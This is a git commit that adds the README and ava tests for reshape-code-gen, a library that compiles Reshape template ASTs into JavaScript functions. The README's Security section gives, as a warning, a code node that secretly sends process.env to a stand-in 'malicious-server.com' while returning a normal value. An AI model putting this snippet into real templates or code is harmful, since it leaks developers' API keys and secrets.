46f912aaab44df87dc04b817726da0739900a194
Jeff Escalante <jescalan@users.noreply.github.com>
2016-08-09 15:29:17 -0400

    fresh start

---
+++ README.md
@@ -0,0 +1,106 @@
+# Reshape Code Generator
+
+[![npm](https://img.shields.io/npm/v/reshape-code-gen.svg?style=flat-square)](https://npmjs.com/package/reshape-code-gen)
+[![tests](https://img.shields.io/travis/reshape/code-gen.svg?style=flat-square)](https://travis-ci.org/reshape/code-gen?branch=master)
+[![dependencies](https://img.shields.io/david/reshape/code-gen.svg?style=flat-square)](https://david-dm.org/reshape/code-gen)
+[![coverage](https://img.shields.io/coveralls/reshape/code-gen.svg?style=flat-square)](https://coveralls.io/r/reshape/code-gen?branch=master)
+
+Convert a Reshape AST into a Javascript function
+
+> **Note:** This project is in early development, and versioning is a little different. [Read this](http://markup.im/#q4_cRZ1Q) for more details.
+
+### Installation
+
+`npm install reshape-code-gen -S`
+
+> **Note:** This project is compatible with node v6+ only
+
+### Usage
+
+Usage is very straightforward. Just require the library and pass it a reshape AST, and it will return a function as a string. When you call the function, it will return the resulting html as a string.
+
+```js
+const generate = require('reshape-code-gen')
+
+const tpl = generate([
+  { type: 'string', content: 'hello ', line: 1, col: 1 },
+  { type: 'code', value: 'planet', line: 1, col: 7 }
+], {/* options */})
+
+tpl({ planet: 'world' }) // 'hello world'
+```
+
+### Options
+
+| Name | Description | Default |
+| ---- | ----------- | ------- |
+| **selfClosing** | style for handling self-closing tags. can be `slash` (`<br />`), `tag` (`<br></br>`), or `close` (`<br>`) | `close` |
+| **runtimeName** | custom name for the runtime object | `__runtime` |
+| **returnString** | gives back a string instead of a function | `false` |
+| **scopedLocals** | use `locals.foo` instead of `foo` in code nodes. this will speed up compile time, but be less pretty | `false`
+
+### Code Block Helpers
+
+Within the `content` of a `code` node, there are two special helpers that can be used:
+
+#### `__nodes`
+
+A helper that can be used inside of a `code` node's content in order to inject an already-generated AST. For example:
+
+```js
+{
+  type: 'code',
+  content: 'foo === "bar" ? __nodes[0] : __nodes[1]',
+  nodes: [
+    { type: 'text', content: 'truth' },
+    { type: 'text', content: 'lies' }
+  ]
+}
+```
+
+The `__nodes` helper is an array, and you can use the `nodes` property to hold on to values. Values can be a single node or a full tree, they will be evaluated, and the result will be substituted in where the `__nodes` marker is.
+
+####  `__runtime`
+
+This helper can be used to access any functions on the runtime object. It will work under the same name whether the user has changed the runtime name via the options or not. For example:
+
+```js
+{
+  type: 'code',
+  content: '__runtime.escape(foo)'
+}
+```
+
+### Security
+
+Please note that this library produces a function as its output that could be influenced by user input and will most likely run inside your application environment. While the default output is evaluated in a [sandbox](https://nodejs.org/api/vm.html), when the function is executed it will have full access to any part of your code's environment, as all functions do.
+
+Chances are that any `code` nodes in your templates are your own code, probably for evaluating a local variable. However, if any type of outside user input is accepted and evaluated as a `code` node, or if a malicious plugin is being used, you have a serious security vulnerability on your hands. This is especially the case when using the `outputString` option and executing templates client-side. Keep in mind that it is also possible for plugins to contain malicious code, so be sure that you trust and have evaluated the source of any plugins you are using.
+
+Here's an example of how a `code` node could be used to compromise your secure information:
+
+```js
+{
+  type: 'code',
+  content: `
+    const http = require(\'http\')
+    const req = http.request({
+      hostname: 'http://malicious-server.com',
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' }
+    })
+    req.write(JSON.stringify(process.env))
+    req.end()
+    foo
+  `
+}
+```
+
+In this example, the code node will return `foo` from your local variables as if all is well, but in the background will send the contents of your environment, which often includes private API keys and such, to a malicious server. This example would work in node, but it would also be simple to add a version that would work in the browser, or even both, with an environment check. And this is a very tame example as well, arbitrarily injected code could easily be used to get or delete your database's contents, make financial transactions, conduct actions as a logged-in user, etc.
+
+While a situation like this is unlikely to happen, and all core plugins protect against it as much as possible, it is still something to keep in mind. _Especially_ if there is any user input inserted into your templates that could be potentially evaluated as code and not as a string.
+
+### License & Contributing
+
+- Details on the license [can be found here](LICENSE.md)
+- Details on running tests and contributing [can be found here](contributing.md)
---
+++ test/index.js
@@ -0,0 +1,252 @@
+const reshape = require('reshape')
+const customElements = require('reshape-custom-elements')
+const test = require('ava')
+const path = require('path')
+const {readFileSync} = require('fs')
+const generator = require('..')
+const parser = require('reshape-parser')
+const fixtures = path.join(__dirname, 'fixtures')
+
+test('basic', (t) => {
+  const html = readFileSync(path.join(fixtures, 'basic.html'), 'utf8')
+  return reshape({ plugins: customElements(), generator, parser })
+    .process(html)
+    .then((res) => {
+      t.truthy(res.output().trim() === '<p wow="foo" bar="asd">hello world</p>')
+    })
+})
+
+test('code', (t) => {
+  const res = generator([
+    {
+      type: 'tag',
+      name: 'p',
+      attrs: { foo: { type: 'text', content: 'bar' } },
+      content: [
+        { type: 'text', content: 'hello ' },
+        { type: 'code', content: 'planet' },
+        { type: 'text', content: '!' }
+      ]
+    }
+  ])
+  t.truthy(res({ planet: 'world' }) === '<p foo="bar">hello world!</p>')
+})
+
+test('runtime', (t) => {
+  const runtime = { changeToDoge: (input) => 'doge' }
+  const res = generator.call({ runtime }, [
+    { type: 'text', content: 'it\'s a ' },
+    { type: 'code', content: '__runtime.changeToDoge("cate")' },
+    { type: 'text', content: '!' }
+  ])
+  t.truthy(res() === 'it\'s a doge!')
+})
+
+test('customized runtime name', (t) => {
+  const runtime = { changeToDoge: (input) => 'doge' }
+  const res = generator.call({ runtime }, [
+    { type: 'text', content: 'it\'s a ' },
+    { type: 'code', content: '__runtime.changeToDoge("cate")' },
+    { type: 'text', content: '!' }
+  ], { runtimeName: '__funtime__' })
+  t.truthy(res() === 'it\'s a doge!')
+})
+
+test('return string option', (t) => {
+  const res = generator([
+    { type: 'text', content: 'hello' }
+  ], { returnString: true })
+  t.truthy(typeof res === 'string')
+  t.truthy(eval(res)() === 'hello') // eslint-disable-line
+})
+
+test('runtime with return string', (t) => {
+  const res = generator([
+    { type: 'code', content: '__runtime.changeToDoge("cate")' }
+  ], { returnString: true })
+  t.truthy(typeof res === 'string')
+  const __runtime = { changeToDoge: (input) => 'doge' } // eslint-disable-line
+  t.truthy(eval(res)() === 'doge') // eslint-disable-line
+})
+
+test('nested elements', (t) => {
+  const res = generator([
+    {
+      type: 'tag',
+      name: 'l1',
+      content: [
+        {
+          type: 'tag',
+          name: 'l2',
+          content: [
+            {
+              type: 'tag',
+              name: 'l3',
+              content: [{ type: 'text', content: 'l3 text' }]
+            },
+            { type: 'text', content: 'l2 text' }
+          ]
+        }
+      ]
+    }
+  ])
+  t.truthy(res() === '<l1><l2><l3>l3 text</l3>l2 text</l2></l1>')
+})
+
+test('self-closing tags', (t) => {
+  const res = generator([{ type: 'tag', name: 'br' }])
+  t.truthy(res() === '<br>')
+})
+
+test('alternate self-closing options', (t) => {
+  const brTree = [{ type: 'tag', name: 'br' }]
+  const r1 = generator(brTree, { selfClosing: 'slash' })
+  const r2 = generator(brTree, { selfClosing: 'tag' })
+  const r3 = generator(brTree, { selfClosing: 'close' })
+
+  t.truthy(r1() === '<br />')
+  t.truthy(r2() === '<br></br>')
+  t.truthy(r3() === '<br>')
+})
+
+test('self-closing invalid option', (t) => {
+  t.throws(() => generator([], { selfClosing: 'snargle' }), "'snargle' is an invalid option for 'selfClosing'. You can use 'close', 'tag', or 'slash'")
+})
+
+test('single attribute', (t) => {
+  const res = generator([{
+    type: 'tag',
+    name: 'div',
+    attrs: { id: { type: 'text', content: 'test' } }
+  }])
+  t.truthy(res() === '<div id="test"></div>')
+})
+
+test('multiple attributes', (t) => {
+  const res = generator([{
+    type: 'tag',
+    name: 'div',
+    attrs: {
+      id: { type: 'text', content: 'test' },
+      foo: { type: 'text', content: 'bar' }
+    }
+  }])
+  t.truthy(res() === '<div id="test" foo="bar"></div>')
+})
+
+test('boolean attributes', (t) => {
+  const res = generator([{
+    type: 'tag',
+    name: 'input',
+    attrs: {
+      type: { type: 'text', content: 'checkbox' },
+      checked: { type: 'text', content: '' }
+    }
+  }])
+  t.truthy(res() === '<input type="checkbox" checked>')
+})
+
+test('code in attribute', (t) => {
+  const res = generator([{
+    type: 'tag',
+    name: 'div',
+    attrs: {
+      code: { type: 'code', content: 'foo' }
+    }
+  }])
+  t.truthy(res({ foo: 'bar' }) === '<div code="bar"></div>')
+})
+
+test('code and string in attribute', (t) => {
+  const res = generator([{
+    type: 'tag',
+    name: 'div',
+    attrs: {
+      code: [
+        { type: 'text', content: 'class-' },
+        { type: 'code', content: 'foo' }
+      ]
+    }
+  }])
+  t.truthy(res({ foo: 'bar' }) === '<div code="class-bar"></div>')
+})
+
+// technically, this would need to be wrapped in parens to be an expression
+// but we auto-wrap in the code gen
+test('non-expression still works as expected', (t) => {
+  const res = generator([{
+    type: 'code',
+    content: '1 + 1'
+  }])
+  t.truthy(res() === '2')
+})
+
+// not adviseable, but valid
+test('tag in attribute', (t) => {
+  const res = generator([{
+    type: 'tag',
+    name: 'div',
+    attrs: {
+      code: [
+        { type: 'tag', name: 'p' }
+      ]
+    }
+  }])
+  t.truthy(res() === '<div code="<p></p>"></div>')
+})
+
+test('only one code node', (t) => {
+  const res = generator([{
+    type: 'code',
+    content: 'foo'
+  }])
+  t.truthy(res({ foo: 'bar' }) === 'bar')
+})
+
+test('two code nodes in a row', (t) => {
+  const res = generator([{
+    type: 'code',
+    content: 'foo'
+  }, {
+    type: 'code',
+    content: 'wow'
+  }])
+  t.truthy(res({ foo: 'bar', wow: 'amaze' }) === 'baramaze')
+})
+
+test('__nodes code helper', (t) => {
+  const res = generator([{
+    type: 'code',
+    content: 'true ? __nodes[0] : __nodes[1]',
+    nodes: [
+      { type: 'text', content: 'truth' },
+      { type: 'text', content: 'lies' }
+    ]
+  }])
+  const res2 = generator([{
+    type: 'code',
+    content: 'false ? __nodes[0] : __nodes[1]',
+    nodes: [
+      { type: 'text', content: 'truth' },
+      { type: 'text', content: 'lies' }
+    ]
+  }])
+  t.truthy(res() === 'truth')
+  t.truthy(res2() === 'lies')
+})
+
+test('scopedLocals option', (t) => {
+  const res = generator([{
+    type: 'code',
+    content: 'locals.foo'
+  }], { scopedLocals: true })
+  t.truthy(res({ foo: 'bar' }) === 'bar')
+})
+
+test('unrecognized node type', (t) => {
+  const tree = [{
+    type: 'snargle',
+    content: 'foo'
+  }]
+  t.throws(() => generator(tree))
+})
